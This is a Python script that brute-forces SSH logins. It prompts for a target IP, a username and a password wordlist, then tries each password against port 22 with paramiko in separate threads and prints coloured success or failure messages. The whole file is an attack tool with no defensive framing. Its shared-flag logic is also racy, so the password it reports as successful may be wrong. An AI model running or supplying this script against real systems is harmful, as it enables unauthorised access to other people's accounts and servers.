import paramiko
import os
import sys
import socket
import termcolor
import threading
import time

stop_flag = 0

def ssh_scan(password):

    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)

    try:
        ssh.connect(host, username=username, port=22, password=password)
        stop_flag = 1
        # print(f"Login Successful using password '{password}' for the account '{username}'.")
    except:
        stop_flag = 2

    ssh.close()

host = input(termcolor.colored(("[*]Enter Target's IP Address For Bruteforcing: "), 'blue'))
username = input(termcolor.colored(("[*] Enter Target's Username For Bruteforcing: "), 'blue'))
password_file = input(termcolor.colored(("[*] Enter Password File/Path Which Will Be Used For Bruteforcing: "), 'blue'))
print("\n")

print(termcolor.colored(("[*_*]Starting Threaded Bruteforcing Attack!"), 'yellow'))
print('\n')

if os.path.exists(password_file) == False:
    print(termcolor.colored(("The Specified File/Path Does Not Exist, Please Try Again: "), 'red'))
    sys.exit(1)

with open(password_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        t = threading.Thread(target=ssh_scan, args=(password, ))
        t.start()
        time.sleep(0.5)
        if stop_flag == 1:
            print(termcolor.colored((f"Login Successful using password '{password}' for the account '{username}'."), 'green'))
            t.join()
            exit()
        elif stop_flag == 2:
            print(termcolor.colored((f"Login Unsuccessful using password '{password}'."), 'red'))



